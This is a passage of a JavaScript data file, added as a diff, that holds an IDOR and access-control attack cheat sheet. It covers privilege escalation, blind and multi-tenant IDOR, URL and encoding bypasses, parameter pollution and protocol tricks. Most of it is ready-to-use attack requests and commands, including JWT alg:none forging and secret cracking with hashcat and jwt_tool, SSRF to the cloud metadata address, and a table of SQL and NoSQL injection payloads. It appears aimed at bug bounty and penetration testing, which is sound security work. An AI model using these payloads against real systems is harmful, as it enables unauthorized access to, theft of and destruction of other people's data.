+   code:`# Standard user token accessing admin report:\nGET /api/reports/REPORT-ADMIN-001\nAuthorization: Bearer <standard_user_token>\n\n# Sources of admin IDs:\n- Error messages: "Cannot access REPORT-ADMIN-001"\n- API docs: example IDs in documentation\n- Swagger examples\n- Other API responses mentioning admin resources`},
+  {title:"Role field toggle / mass assignment escalation",risk:"critical",rl:"Critical",
+   desc:"Look for role/is_admin fields in API responses. Try sending them in update requests to escalate your own privileges.",
+   code:`# Server response reveals role:\n{"user_id": 10, "is_admin": false, "role": "user"}\n\n# Escalation attempt:\nPUT /api/users/10/profile\n{"is_admin": true}\n\nPUT /api/profile\n{"role": "admin", "permission_level": 9}\n\nPATCH /api/users/10\n{"attributes": {"role": "super_admin"}}`,
+   tip:"<b>Pro tip:</b> Also try sending role fields during account registration — some apps don't strip them."},
+  {title:"Admin endpoint case/path bypass",risk:"high",rl:"High",
+   desc:"Frontend hides admin routes but backend accepts them from any authenticated user. Try case variations and alternate paths.",
+   code:`# Hidden admin endpoints:\nGET /admin/users\nGET /Admin/users       # case bypass\nGET /ADMIN/users\nGET /manage/users\nGET /internal/users\nGET /system/users\nGET /console/users\n\n# Version bypass:\nGET /api/v1/admin/users  # v1 may lack auth checks`,
+   tip:"<b>Pro tip:</b> Use SecLists admin-panels wordlist with ffuf to find hidden admin endpoints."},
+  {title:"JWT claim modification for privilege escalation",risk:"critical",rl:"Critical",
+   desc:"Modify JWT token claims (sub, role, user_id) without signature. Use alg:none attack or weak secret brute force.",
+   code:`# Decode JWT:\nbase64_decode(header) → {"alg":"HS256","typ":"JWT"}\nbase64_decode(payload)→ {"sub":"10","role":"user"}\n\n# alg:none attack:\n# Set alg to none, modify payload, empty signature\nnew_payload = {"sub":"1","role":"admin"}\n\n# Tool: jwt_tool\npython3 jwt_tool.py TOKEN -T -pc role -pv admin -X a`,
+   tip:"<b>Pro tip:</b> Also try changing 'HS256' to 'RS256' if the server accepts both algorithms."},
+  {title:"Indirect object reference via role-filtered data",risk:"high",rl:"High",
+   desc:"Some endpoints return different data based on role — but the filtering is done client-side, not server-side.",
+   code:`# API returns full data, frontend hides admin fields:\n# Response: {user_id:10, salary:50000, ssn:"XXX-XX-XXXX"}\n# Frontend hides salary/ssn from standard users\n# but the API already returned it!\n\n# Check raw API responses via Burp — not browser UI\n# Look for hidden fields the UI doesn't render`},
+  {title:"Function-level bypass via parameter injection",risk:"high",rl:"High",
+   desc:"Some apps check route-level permissions but not object-level. Inject admin function IDs into standard user routes.",
+   code:`# Standard user route with admin resource ID:\nGET /api/user/me/documents/ADMIN-DOC-001\nGET /api/user/10/reports/ADMIN-REPORT-001\n\n# Function injection:\nPOST /api/user/action\n{"action": "admin_export", "user_id": 9}`},
+]},
+
+{id:5,label:"Blind IDOR",fullLabel:"Blind IDOR Detection",tag:"Attack",tc:"tag-attack",
+info:"The most underestimated variant. No data returned but action succeeds on victim's resource. A 204 No Content is NOT evidence of authorization.",
+techniques:[
+  {title:"Delete victim's resource (blind)",risk:"critical",rl:"Critical",
+   desc:"Test DELETE and destructive actions on resources you don't own. Confirm by checking if the resource still exists as the legitimate owner.",
+   code:`DELETE /api/comments/COMMENT-5521\nAuthorization: Bearer <attacker_token>\n\nHTTP/1.1 204 No Content  ← IDOR!\n\n# Verify impact: login as victim, check comment\n# If comment is gone → confirmed Blind IDOR\n# CVSS: 7.5–8.8 (data destruction)`,
+   tip:"<b>Pro tip:</b> Confirm every 204 by verifying the side effect. Don't assume 204 means protected."},
+  {title:"Trigger victim-side actions",risk:"high",rl:"High",
+   desc:"Some endpoints trigger actions (send email, mark read, process order) on behalf of other users. Monitor victim's account for side effects.",
+   code:`# Mark another user's notifications as read:\nPOST /api/notifications/mark-read\n{"notification_ids": [881, 882, 883]}\n# → victim's notifications marked read\n\n# Trigger export email to victim:\nPOST /api/export\n{"user_id": 9, "format": "csv"}\n# → victim receives export email`,
+   tip:"<b>Pro tip:</b> Set up victim email forwarding to attacker inbox to catch blind side effects."},
+  {title:"Blind write IDOR — modify without seeing response",risk:"critical",rl:"Critical",
+   desc:"PUT/PATCH with 200 OK but no body, or with generic success message. Verify by reading the resource back as the legitimate owner.",
+   code:`PATCH /api/user/9/settings\n{"notifications": false}\n\nHTTP/1.1 200 OK\n{"success": true}  ← no data, blind result\n\n# Verify: login as victim, check notification setting\n# If changed → confirmed blind write IDOR`},
+  {title:"State change IDOR — workflow manipulation",risk:"high",rl:"High",
+   desc:"Change the state of another user's resource (approve, reject, archive, publish) without seeing the new state in the response.",
+   code:`# Cancel another user's order:\nPOST /api/orders/ORD-victim-001/cancel\nHTTP/1.1 200 OK {"message": "Cancelled"}\n\n# Publish another user's draft:\nPOST /api/posts/POST-victim-001/publish\n\n# Archive another user's project:\nPUT /api/projects/PROJ-9/status\n{"status": "archived"}`},
+  {title:"Ownership transfer IDOR",risk:"critical",rl:"Critical",
+   desc:"Transfer ownership of victim's resource to attacker's account, or reassign a resource to a different user.",
+   code:`PUT /api/documents/DOC-victim-001/owner\n{"new_owner_id": 10}  # attacker's ID\n\nPATCH /api/projects/PROJ-victim-001\n{"owner": 10, "collaborators": [10]}\n\n# After transfer: attacker now legally "owns" the resource`,
+   tip:"<b>Pro tip:</b> Ownership transfer IDORs are Critical — attacker gains persistent access to victim data."},
+]},
+
+{id:6,label:"Multi-Tenant",fullLabel:"Multi-Tenant IDOR",tag:"Attack",tc:"tag-attack",
+info:"Cross-organization access. Force multiplier — a single IDOR exposes an entire organization's data. Always Critical severity. SaaS applications with org_id, tenant_id, or workspace_id are high-value targets.",
+techniques:[
+  {title:"org_id parameter injection",risk:"critical",rl:"Critical",
+   desc:"Replace your org_id with another tenant's ID in query params, URL path, and request body. This is the most common multi-tenant IDOR.",
+   code:`# Query parameter:\nGET /api/customers?org_id=tenant_bbb\nAuthorization: Bearer <tenant_aaa_user>\n\n# URL path:\nGET /api/v1/orgs/tenant_bbb/customers\n\n# Request body:\nPOST /api/reports/generate\n{"org_id": "tenant_bbb", "type": "all_data"}\n\n# CVSS: 9.1 (Critical) — exposes entire org`,
+   tip:"<b>Pro tip:</b> Even one endpoint with org_id bypass can expose ALL of the target organization's data."},
+  {title:"workspace_id / account_id bypass",risk:"critical",rl:"Critical",
+   desc:"SaaS apps use various terms for tenant scope. Test all of them.",
+   code:`# Try all tenant scope parameters:\n?workspace_id=ws-victim\n?account_id=acc-victim\n?company_id=comp-victim\n?team_id=team-victim\n?project_id=proj-victim (if project-scoped)\n?site_id=site-victim\n?store_id=store-victim`},
+  {title:"Subdomain-based tenant isolation bypass",risk:"critical",rl:"Critical",
+   desc:"Apps using subdomain-per-tenant (victim.app.com) may still accept tenant IDs in API calls, bypassing subdomain isolation.",
+   code:`# Normal flow: victim.app.com → tenant auto-detected\n# Attack: call API directly with victim tenant ID\n\ncurl https://api.app.com/v1/users \\\n  -H "Authorization: Bearer <attacker_token>" \\\n  -H "X-Tenant-ID: tenant_bbb"\n\n# Or in body:\ncurl -X POST https://api.app.com/graphql \\\n  -d '{"query":"{ org(id:\\"tenant_bbb\\") { users } }"}'`,
+   tip:"<b>Pro tip:</b> APIs often share infrastructure across tenants even when UI is subdomain-separated."},
+  {title:"Cross-tenant resource reference",risk:"critical",rl:"Critical",
+   desc:"Even with correct org_id, resource IDs may be globally unique but ownership check is missing — allowing cross-org resource access.",
+   code:`# Attacker is in org-aaa, victim resource in org-bbb:\n# Resource IDs are global UUIDs\n\nGET /api/documents/DOC-bbb-001\nAuthorization: Bearer <org-aaa user token>\n# Server checks: "is user authenticated?" ✓\n# Server skips: "does user's org own DOC-bbb-001?" ✗`,
+   tip:"<b>Pro tip:</b> UUID-based resource IDs don't prevent IDOR — ownership check is still required."},
+  {title:"Tenant role confusion",risk:"critical",rl:"Critical",
+   desc:"User is an admin in Tenant A but only a member in Tenant B. Test whether Tenant A admin token grants admin access in Tenant B.",
+   code:`# User is: org-aaa ADMIN, org-bbb MEMBER\n# Test admin actions in org-bbb:\nDELETE /api/orgs/org-bbb/users/999\nPUT /api/orgs/org-bbb/settings/billing\nGET /api/orgs/org-bbb/audit-log\n\n# Role should be scoped to org, not global!`},
+  {title:"Invitation/sharing link IDOR",risk:"high",rl:"High",
+   desc:"Sharing links or invitation tokens that don't validate the inviting user's current org/permissions.",
+   code:`# Invitation token not bound to org:\nGET /api/invite/accept?token=INV-TOKEN-001\n# Token was from org-aaa but accessing as org-bbb member\n\n# File sharing link IDOR:\nGET /api/shared/FILE-victim-001?share_token=abc\n# Token valid but file belongs to other tenant`,
+   tip:"<b>Pro tip:</b> Sharing links commonly lack tenant binding checks — high-yield target."},
+]},
+
+{id:7,label:"2nd Order",fullLabel:"Second-Order IDOR",tag:"Advanced",tc:"tag-advanced",
+info:"Identifier created in one workflow step is reused in a later step without re-validating ownership. Requires multi-step reasoning — completely invisible to scanners.",
+techniques:[
+  {title:"Workflow resume without re-validation",risk:"critical",rl:"Critical",
+   desc:"Create a resource as User A. Then try to resume/continue/complete the workflow as User B using User A's resource ID.",
+   code:`# Step 1: User A creates draft (ownership set):\nPOST /api/requests → {"id": "REQUEST-001", "owner": "A"}\n\n# Step 3: User B tries to resume with A's ID:\nPOST /api/requests/resume\n{"request_id": "REQUEST-001"}  # ← User A's resource\nAuthorization: Bearer <User_B_token>\n\n# If server processes without re-checking owner → IDOR`,
+   tip:"<b>Pro tip:</b> Step-3 endpoints often say 'authorized earlier' and skip the check. Test every step independently."},
+  {title:"Checkout / payment flow IDOR",risk:"critical",rl:"Critical",
+   desc:"E-commerce checkout flows often validate cart ownership at Step 1 (add to cart) but not at Step 3 (payment). Inject victim's cart ID at payment step.",
+   code:`# User A has cart: CART-001\n# User B has cart: CART-002\n\n# User B starts checkout with their cart:\nPOST /checkout/init {"cart_id": "CART-002"}\n\n# At payment step, swap cart ID:\nPOST /checkout/payment\n{"cart_id": "CART-001", "payment": "card_B"}\n# User B pays but gets User A's cart items?`,
+   tip:"<b>Pro tip:</b> Financial flow IDORs: test payment, refund, subscription upgrade all separately."},
+  {title:"Async job / export result IDOR",risk:"high",rl:"High",
+   desc:"Trigger an async job as User A. Then poll/download the result as User B using the job ID.",
+   code:`# User A creates export job:\nPOST /api/export/start\n{"format":"csv","data":"all"}\n→ {"job_id": "JOB-12345"}\n\n# User B polls with User A's job ID:\nGET /api/export/JOB-12345/status  # User B's token\nGET /api/export/JOB-12345/download\n\n# If returns User A's data → second-order IDOR`},
+  {title:"Session handoff / delegate token IDOR",risk:"critical",rl:"Critical",
+   desc:"Delegated sessions, impersonation tokens, or session handoffs that don't re-validate the original resource ownership.",
+   code:`# Create delegate token as User A:\nPOST /api/delegate\n{"resource_id": "RES-001", "delegate_to": "agent"}\n→ {"delegate_token": "DEL-TOKEN-XYZ"}\n\n# Use token from different user context:\nGET /api/resources/RES-victim-001\nAuthorization: Delegate DEL-TOKEN-XYZ\n# Token structurally valid, ownership unchecked`},
+  {title:"Approval workflow hijack",risk:"critical",rl:"Critical",
+   desc:"Submit approval for another user's pending request by injecting their request ID into the approval endpoint.",
+   code:`# User A has pending approval: APPROVAL-001\n# User B submits approval for it:\nPOST /api/approvals/APPROVAL-001/approve\nAuthorization: Bearer <User_B_token>\n\n# Or escalate your own request using admin approval:\nPOST /api/approvals/MY-APPROVAL/approve\nAuthorization: Bearer <admin_user_token>  # if obtainable`},
+]},
+
+{id:8,label:"URL Bypass",fullLabel:"Path & URL Manipulation",tag:"Bypass",tc:"tag-bypass",
+info:"Manipulate URL structure to route around authorization middleware that relies on exact path matching.",
+techniques:[
+  {title:"Trailing slash bypass",risk:"medium",rl:"Medium",
+   desc:"Trailing slashes can route to different middleware handlers. Auth checks tied to exact path strings miss the slash variant.",
+   code:`GET /api/users/9  → GET /api/users/9/\nGET /api/users/9  → GET /api/users/9//\nGET /api/users/9  → GET /api/users/9/.\nGET /api/users/9  → GET /api/users/9%2F`},
+  {title:"Double slash & path obfuscation",risk:"medium",rl:"Medium",
+   desc:"Path normalization differences between routing layer (checks auth) and backend (executes query).",
+   code:`GET /api/v5/users//9\nGET /api/v5/users/./9\nGET /api/v5//users/9\nGET /api//v5/users/9\nGET /api/v5/users/%2F9\nGET /api/v5/users/..%2F..%2Fusers/9`},
+  {title:"API version downgrading",risk:"high",rl:"High",
+   desc:"Older API versions often have weaker or absent auth checks. Always try v1, v2 when v3+ is secured.",
+   code:`GET /api/v3/users/9  # secured\n→ GET /api/v2/users/9\n→ GET /api/v1/users/9\n→ GET /v1/users/9\n→ GET /users/9\n→ GET /api/users/9  # no version`,
+   tip:"<b>Pro tip:</b> v1 endpoints sometimes bypass rate limiting too — useful for enumeration."},
+  {title:"Path traversal in resource ID",risk:"high",rl:"High",
+   desc:"Use ../ to escape your authorized scope. Useful when the resource owner ID is embedded in the path.",
+   code:`POST /users/delete/10/../9\nGET  /files/user_10/../user_9/secret.pdf\nGET  /api/data/10/../../9/profile\n\n# URL-encoded variants:\nGET /api/users/10%2F..%2F9\nGET /api/users/10/..%2F9`},
+  {title:"Case variation & key name swapping",risk:"medium",rl:"Medium",
+   desc:"Case-sensitive auth checks at routing layer, case-insensitive matching at handler. Also swap param names.",
+   code:`GET /api/User/9   vs  /api/user/9\nGET /API/users/9  vs  /api/users/9\n\n# Param name variations:\n?user_id=9   → ?userId=9\n?user_id=9   → ?uid=9\n?user_id=9   → ?accountId=9\n?user_id=9   → ?member_id=9`},
+  {title:"Wildcard & keyword substitution",risk:"medium",rl:"Medium",
+   desc:"Some endpoints have undocumented all-access routes. Replace ID with wildcards or keywords.",
+   code:`GET /api/users/9\n→ GET /api/users/*\n→ GET /api/users/all\n→ GET /api/users/list\n→ GET /api/users/export\n→ GET /api/users/null\n→ GET /api/users/undefined\n→ GET /api/users/NaN\n→ GET /api/users/[object Object]`},
+  {title:"X-Original-URL & proxy header bypass",risk:"medium",rl:"Medium",
+   desc:"Reverse proxies may honor override headers that bypass access control enforced at the proxy layer.",
+   code:`GET /api/public\nX-Original-URL: /api/admin/users\n\nGET /\nX-Rewrite-URL: /api/admin/users\n\nGET /api/public\nX-Custom-IP-Authorization: 127.0.0.1\nForwarded: for=127.0.0.1;host=internal`},
+  {title:"Fragment & extension injection",risk:"low",rl:"Low",
+   desc:"Append fragments, file extensions, or suffixes that some routing layers strip before matching.",
+   code:`GET /api/users/9.json\nGET /api/users/9.xml\nGET /api/users/9.txt\nGET /api/users/9.php\nGET /api/users/9#fragment\nGET /api/users/9?format=json`},
+]},
+
+{id:9,label:"Param Abuse",fullLabel:"Parameter & Body Manipulation",tag:"Attack",tc:"tag-attack",
+info:"Confuse backend parameter parsing by manipulating where and how object identifiers appear in requests.",
+techniques:[
+  {title:"Hidden parameter injection",risk:"high",rl:"High",
+   desc:"Add ID parameters that the endpoint doesn't normally expose but the backend silently processes.",
+   code:`# Endpoint doesn't use user_id — add it anyway:\nGET /api/messages → GET /api/messages?user_id=9\nGET /api/feed     → GET /api/feed?account_id=9\n\n# Discover hidden params with Arjun:\narjun -u https://target/api/messages \\\n      -m GET --include-large\n\n# ParamMiner Burp extension also finds these`,
+   tip:"<b>Pro tip:</b> Backends often have dead code that reads user_id from params as a legacy feature."},
+  {title:"HTTP Parameter Pollution (HPP)",risk:"high",rl:"High",
+   desc:"Send the same parameter multiple times. Framework behavior varies — PHP uses last, Java uses first, Node creates array.",
+   code:`?user_id=10&user_id=9\n\n# Framework behavior:\nPHP (last):   user_id = 9   ← attacker gets victim data\nASP.NET:      user_id = "10,9"\nJSP/Servlet:  user_id = 10  (first)\nNode/Express: user_id = ["10","9"]\n\n# Also test in POST body:\nuser_id=10&user_id=9`},
+  {title:"JSON parameter pollution",risk:"medium",rl:"Medium",
+   desc:"Duplicate JSON keys — parsers extract different values, potentially using the later/earlier one.",
+   code:`{"user_id": 10, "user_id": 9}\n\n# Different parsers:\nPython json: last key wins → user_id=9\nJavaScript:  last key wins → user_id=9\nJava Jackson: first key wins → user_id=10\nPHP:          last key wins → user_id=9`},
+  {title:"JSON array & object wrapping",risk:"medium",rl:"Medium",
+   desc:"Wrap primitive ID in array or object — type coercion or nested parsing may extract differently.",
+   code:`# Normal: {"user_id": 9}\n\n# Array wrap:\n{"user_id": [9]}\n{"user_id": [10, 9]}\n\n# Nested object:\n{"user_id": {"id": 9}}\n{"user_id": {"$eq": 9}}  # NoSQL injection\n\n# String wrap:\n{"user_id": "9"}\n{"user_id": " 9 "}`},
+  {title:"Replace parameter name entirely",risk:"medium",rl:"Medium",
+   desc:"When album_id is checked, backend may also accept account_id, owner_id, or similar alternate names.",
+   code:`# Original:\nGET /api/photos?album_id=MY_ALBUM\n\n# Try alternate names:\n?account_id=9\n?owner_id=9\n?creator_id=9\n?uploaded_by=9\n?author_id=9\n?member_id=9`},
+  {title:"Mass assignment via extra fields",risk:"critical",rl:"Critical",
+   desc:"Send privileged fields in create/update requests that the backend should ignore but doesn't filter.",
+   code:`# Registration — add role:\nPOST /api/register\n{"email":"x@x.com","password":"pass",\n "role":"admin","is_verified":true}\n\n# Profile update — add ownership:\nPUT /api/profile\n{"name":"X","user_id":9,"org_id":"victim-org"}\n\n# Resource creation — set owner:\nPOST /api/documents\n{"title":"test","owner_id":1,"team_id":"team-A"}`,
+   tip:"<b>Pro tip:</b> Test during registration — orgs often skip mass-assignment protection there."},
+  {title:"Null byte & control character injection",risk:"medium",rl:"Medium",
+   desc:"Null bytes truncate strings in C-based backends. Control characters confuse regex-based validators.",
+   code:`GET /api/users/9%00\nGET /api/users/9%00.jpg\n{"user_id": "9\\u0000"}\n\n# CR/LF injection:\n{"id":"2222%0d%0a1111"}\n{"id":"2222%0a1111"}\n{"id":"2222%0d1111"}\n\n# Tab injection:\n{"id":"2222%091111"}`},
+  {title:"Deserialization object injection",risk:"critical",rl:"Critical",
+   desc:"Send object where primitive expected. Servers blindly deserializing may map to different objects or honor injected fields.",
+   code:`# Instead of: user_id=9\n# Send crafted object:\n{"user": {"id": 9, "role": "admin", "verified": true}}\n\n# Protobuf field injection:\n# Replace user_id field with wrapped message\n\n# Java deserialization:\n# Crafted serialized object with overridden readObject\n\n# Python pickle:\n# Payload that executes arbitrary code on deserialize`},
+]},
+
+{id:10,label:"Encoding",fullLabel:"Encoding & Obfuscation Bypasses",tag:"Bypass",tc:"tag-bypass",
+info:"Encode or transform IDs to bypass validation layers without changing the semantic value that reaches the database.",
+techniques:[
+  {title:"URL encoding variants",risk:"medium",rl:"Medium",
+   desc:"Different URL encoding levels confuse middleware that decodes once but backend decodes twice.",
+   code:`# Single encode:\nGET /api/users/9%20  (space after 9)\nGET /api/users/%399  (% encoded)\n\n# Double encode:\nGET /api/users/%2509  (%09 = TAB)\nGET /api/users/%252F9 (%2F = /)\n\n# Mixed encode:\nGET /api/users/%u0039  (Unicode escape)`},
+  {title:"Base64 decode → modify → re-encode",risk:"high",rl:"High",
+   desc:"Base64 IDs are obfuscated, not encrypted. Decode, modify the inner value, re-encode.",
+   code:`# Identify base64 (ends with == or padding):\nMTIzNg==  →  decode  →  "1236"\n\n# Modify inner value:\n"1235"  →  encode  →  MTIzNQ==\n\n# Base64url (no padding, - instead of +):\neyJ1c2VyX2lkIjoxMH0  # JWT payload\ndecode → {"user_id":10} → modify → re-encode`,
+   tip:"<b>Pro tip:</b> Base64 JSON objects are common — always decode and inspect opaque tokens."},
+  {title:"Type confusion attacks",risk:"medium",rl:"Medium",
+   desc:"Integer/string type mismatches cause different code paths. Loose comparison (==) in PHP/JS is particularly vulnerable.",
+   code:`# Integer vs string:\n{"user_id": 9}    # integer\n{"user_id": "9"}  # string (different in typed langs)\n\n# PHP loose comparison:\n"9" == 9  → true  (loose)\n"9" === 9 → false (strict)\n\n# JavaScript:\n9 == "9"  → true\n9 === "9" → false\n\n# NoSQL type attacks:\n{"user_id": {"$gt": 0}}  # returns all users`},
+  {title:"Leading zeros & numeric formatting",risk:"low",rl:"Low",
+   desc:"Some routing layers and auth checks treat 009 differently from 9, but DB query normalizes both to integer 9.",
+   code:`GET /api/users/9\n→ GET /api/users/09\n→ GET /api/users/009\n→ GET /api/users/0009\n→ GET /api/users/+9\n→ GET /api/users/9.0\n→ GET /api/users/9e0  (scientific notation)`},
+  {title:"Hash & derived ID manipulation",risk:"medium",rl:"Medium",
+   desc:"MD5/SHA hashes of predictable values are not random. Derive victim's hash if you know the input pattern.",
+   code:`# MD5 of email (common pattern):\nattacker_id = md5("attacker@x.com")\nvictim_id   = md5("victim@x.com")\n\n# Python:\nimport hashlib\nvictim_hash = hashlib.md5(b"victim@x.com").hexdigest()\n\n# SHA1:\nvictim_id = sha1("user_9").hexdigest()\n\n# Timestamp-based IDs:\nid = base64(timestamp + user_id)`},
+  {title:"Alternate character encoding",risk:"low",rl:"Low",
+   desc:"Unicode fullwidth digits, HTML entities, and alternate representations that normalize to same value in DB.",
+   code:`# Fullwidth digits (Unicode):\nGET /api/users/９  (U+FF19 = fullwidth 9)\nGET /api/users/９  (renders same, different bytes)\n\n# HTML entities (in JSON sometimes):\n{"user_id": "&#57;"}\n{"user_id": "&#x39;"}\n\n# Punycode in domain-scoped IDs:\n# xn--9-hfa → 9`},
+  {title:"JWT secret brute force",risk:"critical",rl:"Critical",
+   desc:"Weak JWT secrets can be brute forced — then forge tokens for any user ID or role.",
+   code:`# Brute force JWT secret:\nhashcat -a 0 -m 16500 token.jwt rockyou.txt\n\n# jwt_tool:\npython3 jwt_tool.py TOKEN -C -d rockyou.txt\n\n# After finding secret, forge token:\npython3 jwt_tool.py TOKEN -T \\\n  -pc sub -pv "1" \\\n  -ps "found_secret"`,
+   tip:"<b>Pro tip:</b> 'secret', 'password', 'jwt_secret', app name are common weak secrets."},
+  {title:"HMAC timing attack on token validation",risk:"medium",rl:"Medium",
+   desc:"Non-constant-time HMAC comparison leaks whether a token prefix is correct — can be used to forge tokens character by character.",
+   code:`# Timing attack on token:\nimport time, requests\n\nfor char in charset:\n    token = prefix + char + padding\n    start = time.perf_counter()\n    r = requests.get("/api/data", \n        headers={"Token": token})\n    elapsed = time.perf_counter() - start\n    # Longer response time → correct prefix char`},
+]},
+
+{id:11,label:"Protocol",fullLabel:"Protocol & Format Bypasses",tag:"Bypass",tc:"tag-bypass",
+info:"Authorization checks are often tied to specific HTTP methods, content types, or protocols. Switching any of these can bypass the check entirely.",
+techniques:[
+  {title:"HTTP method switching",risk:"high",rl:"High",
+   desc:"Auth middleware often handles methods separately. Protected DELETE may have unprotected GET equivalent, or vice versa.",
+   code:`GET  /api/users/9          # may be protected\nPOST /api/users/9          # test all methods\nPUT  /api/users/9\nDELETE /api/users/9\nPATCH /api/users/9\nHEAD  /api/users/9         # metadata only\nOPTIONS /api/users/9       # CORS check\nTRACE /api/users/9         # debug method`},
+  {title:"X-HTTP-Method-Override",risk:"high",rl:"High",
+   desc:"Firewalls block DELETE/PATCH but POST with override header achieves the same — often bypassing method-specific auth.",
+   code:`POST /api/user/9\nX-HTTP-Method-Override: DELETE\n\nPOST /api/user/9\nX-Method-Override: PUT\n\nPOST /api/user/9\n_method=DELETE  # form-based override\n\n# Also try:\nContent-Type: application/x-www-form-urlencoded\n_method=PATCH&data=value`},
+  {title:"Content-Type switching",risk:"medium",rl:"Medium",
+   desc:"Switch from JSON to form-encoded, XML, or plaintext. Auth may only validate properly for one content type.",
+   code:`# Original:\nContent-Type: application/json\n{"user_id": 9}\n\n# Switch to form:\nContent-Type: application/x-www-form-urlencoded\nuser_id=9\n\n# XML:\nContent-Type: application/xml\n<root><user_id>9</user_id></root>\n\n# Plaintext:\nContent-Type: text/plain\n9`},
+  {title:"File extension bypass",risk:"medium",rl:"Medium",
+   desc:"Access control checks tied to file extension — switching from .json to .xml or .txt bypasses the check.",
+   code:`GET /user_data/2341.json\n→ /user_data/2341.xml\n→ /user_data/2341.txt\n→ /user_data/2341.csv\n→ /user_data/2341\n→ /user_data/2341.bak\n→ /user_data/2341.old`},
+  {title:"GraphQL IDOR",risk:"critical",rl:"Critical",
+   desc:"GraphQL resolvers need per-resolver auth. A gateway auth check doesn't protect individual resolvers. Test queries, mutations, and subscriptions.",
+   code:`# Read IDOR:\nquery { user(id: 9) { email password credit_card } }\n\n# Write mutation IDOR:\nmutation { updateUser(id: 9, email: "hacked@x.com") }\nmutation { deletePost(id: 999) }\n\n# Batch enumeration (bypasses per-request rate limit):\nquery {\n  u1: user(id:1){email} u2: user(id:2){email}\n  u3: user(id:3){email} # ... repeat for all IDs\n}\n\n# Subscription IDOR:\nsubscription { userActivity(userId: 9) }`,
+   tip:"<b>Pro tip:</b> GraphQL introspection reveals all types and fields — use it to find hidden objects."},
+  {title:"gRPC / protobuf IDOR",risk:"high",rl:"High",
+   desc:"gRPC services often have weaker auth than REST endpoints. Test with grpcurl or proxy protobuf traffic through Burp.",
+   code:`# grpcurl test:\ngrpcurl -plaintext \\\n  -d '{"user_id": 9}' \\\n  target.com:9090 \\\n  user.UserService/GetUser\n\n# List available services:\ngrpcurl -plaintext target.com:9090 list\n\n# Burp: use Protobuf Decoder extension\n# intercept binary protobuf and modify field values`,
+   tip:"<b>Pro tip:</b> gRPC services sometimes run on different ports (50051, 9090) — check all ports."},
+  {title:"WebSocket channel IDOR",risk:"high",rl:"High",
+   desc:"WebSocket channels named by user ID often skip per-subscription authorization. Subscribe to victim's channel.",
+   code:`// Connect and subscribe to victim's channel:\nconst ws = new WebSocket("wss://target.com/ws");\nws.onopen = () => {\n  ws.send(JSON.stringify({\n    action: "subscribe",\n    channel: "user_9"  // victim's ID\n  }));\n};\n// If server sends victim's real-time events → IDOR\n\n// Also test:\n{"subscribe": "notifications/9"}\n{"join": "room_9"}\n{"listen": "user:9:events"}`,
+   tip:"<b>Pro tip:</b> Check all subscribe/join/listen message types for missing auth checks."},
+  {title:"Server-Sent Events (SSE) IDOR",risk:"medium",rl:"Medium",
+   desc:"SSE streams tied to user IDs may not validate whether the requesting user owns the stream.",
+   code:`# SSE stream IDOR:\nGET /api/events/stream?user_id=9\nGET /api/sse/user_9\nGET /stream/notifications?for=9\n\n# With attacker's auth token:\ncurl -H "Authorization: Bearer <attacker_token>" \\\n     "https://target.com/api/events?user_id=9" \\\n     -H "Accept: text/event-stream"`},
+]},
+
+{id:12,label:"Payloads",fullLabel:"Injection Payload Reference",tag:"Attack",tc:"tag-attack",
+info:"Quick-reference tables for injection characters, encoding bypasses, and special value payloads.",
+isTable:true,
+payloads:[
+  {v:"%0d%0a",d:"CRLF injection",e:'{"id":"2222%0d%0a1111"}'},
+  {v:"%0a",d:"Line feed",e:'{"id":"2222%0a1111"}'},
+  {v:"%0d",d:"Carriage return",e:'{"id":"2222%0d1111"}'},
+  {v:"%00",d:"Null byte terminator",e:'GET /api/users/9%00'},
+  {v:";",d:"Semicolon separator",e:'{"id":"2222;1111"}'},
+  {v:",",d:"Comma separator",e:'id=10,9'},
+  {v:"|",d:"Pipe char",e:'{"id":"2222|1111"}'},
+  {v:"&",d:"Ampersand (HPP)",e:'?id=10&id=9'},
+  {v:"#",d:"Fragment/comment",e:'{"id":"2222#1111"}'},
+  {v:"[]",d:"Array wrap",e:'{"id":[9]}'},
+  {v:"{}",d:"Object wrap",e:'{"id":{"id":9}}'},
+  {v:"9e0",d:"Scientific float",e:'{"id":9e0}'},
+  {v:"09",d:"Leading zero",e:'GET /api/users/09'},
+  {v:'"9"',d:"Stringified int",e:'{"user_id":"9"}'},
+  {v:"%20",d:"URL-encoded space",e:'GET /api/users/9%20'},
+  {v:"%09",d:"URL-encoded tab",e:'GET /api/users/9%09'},
+  {v:"9.0",d:"Float notation",e:'{"id":9.0}'},
+  {v:"0x09",d:"Hex integer",e:'{"id":"0x09"}'},
+  {v:"+9",d:"Signed integer",e:'GET /api/users/+9'},
+  {v:"9\n",d:"Trailing newline",e:'{"id":"9\\n"}'},
+  {v:"$gt:0",d:"NoSQL injection",e:'{"id":{"$gt":0}}'},
+  {v:"$ne:null",d:"NoSQL not-null",e:'{"id":{"$ne":null}}'},
+  {v:"$regex:.*",d:"NoSQL regex",e:'{"id":{"$regex":".*"}}'},
+  {v:"1=1",d:"SQLi tautology",e:"id=9' OR '1'='1"},
+  {v:"UNION",d:"SQLi union",e:"id=9 UNION SELECT *"},
+  {v:"%0a%0dcc:",d:"Header injection",e:'{"id":"2222%0a%0dcc:1111"}'},
+  {v:"null",d:"Null value",e:'{"id":null}'},
+  {v:"undefined",d:"JS undefined",e:'{"id":undefined}'},
+  {v:"NaN",d:"Not a number",e:'{"id":NaN}'},
+  {v:"-1",d:"Negative ID",e:'GET /api/users/-1'},
+  {v:"0",d:"Zero (edge case)",e:'GET /api/users/0'},
+  {v:"999999",d:"Out-of-range",e:'GET /api/users/999999999'},
+]},
+
+{id:13,label:"Advanced",fullLabel:"Advanced Attack Techniques",tag:"Advanced",tc:"tag-advanced",
+info:"High-complexity techniques that chain multiple vulnerabilities or exploit subtle logic flaws. Often yield Critical findings with large blast radius.",
+techniques:[
+  {title:"SSRF-chained IDOR",risk:"critical",rl:"Critical",
+   desc:"Use SSRF to reach internal APIs that bypass external authentication entirely. Chain SSRF → internal IDOR for resources inaccessible from outside.",
+   code:`# SSRF endpoint:\nPOST /api/webhook\n{"url": "http://internal-api/api/users/9"}\n\n# Fetches internal endpoint without auth:\nPOST /api/preview\n{"url": "http://localhost/admin/users"}\n\n# Metadata service (cloud):\n{"url": "http://169.254.169.254/latest/meta-data/"}\n\n# Chain: SSRF → internal auth bypass → IDOR`,
+   tip:"<b>Pro tip:</b> Internal APIs often have no auth since they're not meant to be reachable externally."},
+  {title:"Race condition IDOR (TOCTOU)",risk:"high",rl:"High",
+   desc:"Time-of-check to time-of-use: send concurrent requests to exploit the window between auth check and action execution.",
